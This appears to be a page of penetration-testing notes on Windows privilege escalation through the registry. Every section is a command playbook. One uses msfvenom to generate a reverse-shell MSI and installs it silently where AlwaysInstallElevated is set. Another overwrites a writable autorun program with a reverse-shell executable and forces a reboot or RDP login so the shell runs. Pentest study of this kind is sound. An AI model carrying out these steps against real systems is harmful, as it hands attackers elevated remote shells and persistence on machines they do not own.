---
title: Registry
parent: Method (Windows)
layout: default
nav_order: 2
---

## AlwaysInstallElevated
1. `winpeas.exe quiet windowscreds` - first check
2. Alternatively check these 2:\
   `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
   `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
3. msfvenom to generate MSI:\
   `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o reverse.msi`
4. Start listener, then run with this: `msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`

## Autorun
1. `winpeas.exe quiet applicationsinfo` - first check
2. Alternatively: use `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` and then check one by one `accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"`
3. Backup the file: `copy "C:\Program Files\Autorun Program\program.exe" C:\Temp`
4. Copy shell: `copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"`
5. Start listener. Restart with `shutdown /r /t 0`. If cannot try RDP it (should autorun the shell without needing to authenticate).